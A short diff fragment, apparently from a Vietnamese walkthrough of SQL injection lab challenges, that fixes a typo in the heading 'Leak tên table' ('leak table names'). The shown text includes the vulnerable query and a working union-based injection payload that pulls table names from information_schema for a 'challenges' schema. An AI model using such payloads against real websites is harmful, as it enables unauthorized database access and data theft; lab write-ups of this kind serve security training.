@@ -60,7 +60,7 @@ SELECT * FROM security.users WHERE id=($id) LIMIT 0,1
 
 Tương tự câu 54.
 
-Lleak tên table:
+Leak tên table:
 
 `?id=0)+union+select+1,2,group_concat(+table_name+)+from+information_schema.tables+where+table_schema="challenges"--+`
 
